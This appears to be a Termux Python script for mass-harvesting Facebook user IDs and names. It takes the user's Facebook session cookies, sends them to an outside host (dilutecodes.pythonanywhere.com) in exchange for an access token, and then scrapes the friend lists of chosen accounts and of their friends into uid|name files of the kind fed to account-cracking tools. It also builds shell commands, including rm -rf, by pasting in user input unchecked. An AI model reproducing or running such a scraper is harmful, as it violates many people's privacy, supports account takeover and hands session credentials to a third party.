
#coding=utf-8
#i m letting this code open - source for now , don't do any encryption on thos script...coded by : Aqib Ali
import requests
import os
import time
import sys

total =[]


def logo():
	os.system('clear')
	pass

def sep_and_save(sav,sep):
	os.system('touch /sdcard/123.txt')
	try:
		for choice_ids in sep:
			os.system('cat '+sav+' | grep "'+choice_ids+'" >> /sdcard/123.txt')
			os.system('sort -r /sdcard/123.txt | uniq > '+sav+'')
			os.system('rm -rf /sdcard/123.txt')
	except:pass

# '61551848680080'

def main():
	logo()
	try:
		token= open ('token_eaa.txt','r',encoding='utf-8').read()
	except FileNotFoundError:
		login_cookie()
	print (" [1] Create unlimited file \n [2] Remove Duplicate and Separate Links \n [3] Change Token ")
	a = input(" choose :")
	if a == "1":
		dump(token)
	elif a == "2":
		logo()
		print(' [*] Example : 10001,61555 etc')
		sep = input(' [*] put digits with comma : ').split(',')
		sav = input(' your file path: ')
		sep_and_save(sav,sep)
		print(" Your file saved in "+sav)
	else:os.system("rm -rf token_eaa.txt");main()
def dump(token):
	logo()
	global total
	ids_list = []
	os.system('rm -rf .a.txt')
	logo()
	
	print(' [*] File Create Unlimited by : Aqib Ali Tamimi ')
	print(51*'-')
	try:
		limit = int(input(' [*] how many uids you wanna dump : '))
	except:
		limit = 3
	for n in range(limit):
		ids_list.append(input(f' [*] Put user id no {n+1} : '))
	print(51*'-')
	sav = input(' [*] put file save path : ')
	logo()
	print(51*'-')
	for id in ids_list:
		json_prams = {
			'uid':id,
			'token':token,}
		posted = requests.get('https://dilutecodes.pythonanywhere.com//file-create',json=json_prams).json()
		
		try:
			status,data = posted['status'],posted['data']
			for accounts in data:
				node2 = accounts['node']
				# imnm = node2['name']
				imuid = node2['id']
				open('.a.txt', 'a', encoding='utf-8').write(imuid + '\n')
				idss = len(open('.a.txt','r').readlines())
				print(f'\r Sucessfully extracted : {id} [{idss}]  ')

		except Exception as e:
			status,msg = posted['status'],posted['message']
			if msg == 'You Have Used This Id Many Times . Use Other Id And Dont Login This Id For 24 hours':
				print(msg)
	file = open('.a.txt', 'r').read().splitlines()
	logo()
	print(' [*] Total User ID To Extract '+str(len(file)))
	print(' [*] Extracting friends of friends ')
	print(51*'-')
	for uid in file:
		json_data2 = {
			'uid':uid,
			'token': token,}
		sys.stdout.write(f'\r Checking friendlist from user id : {uid} Total : {len(total)}  ')
		sys.stdout.flush()
		posted = requests.get('https://dilutecodes.pythonanywhere.com//file-create',json=json_data2).json()
		try:
			status,data = posted['status'],posted['data']
			for accounts in data:
				node2 = accounts['node']
				open(sav, 'a', encoding='utf-8').write(node2['id'] + "|" + node2['name'] + '\n')
				total.append(str(node2['id']))
					
			print(f'\r Sucessfully Extracted : {uid}  ')

		except Exception as e:
			status,msg = posted['status'],posted['message']
			if msg == 'You Have Used This Id Many Times . Use Other Id And Dont Login This Id For 24 hours':
				print(msg)
	print(51*'-')
	print("\r Processs has been Completed ")
	print(" [•] Remove duplicate and separate ")
	print(' [*] Example : 10001,61555 etc')
	sep = input(' [*] put digits with comma : ').split(',')
	sep_and_save(sav,sep)
	print(" Your file saved in "+sav)



	
def login_cookie():
	cok = input('\033[1;97m [*] Put Cookies : ')
	print(51*'-')
	json_data = {'cookie':cok}
	r = requests.get('https://dilutecodes.pythonanywhere.com//login-cookiev2',json=json_data).json()
	try:
		status,token = r['status'],r['token']
		if status == 'success':
			print('\033[1;92m [*] Login Successfull \033[1;97m')
			print(f' [*] Your Token : \033[1;96m{token}\033[1;97m')
			open ('token_eaa.txt','w',encoding='utf-8').write(str(token))
			time.sleep(2)
			main()
		else:
			print(' cookies checkpoint')
			print(r)
	except Exception as e:
		print(e)



main()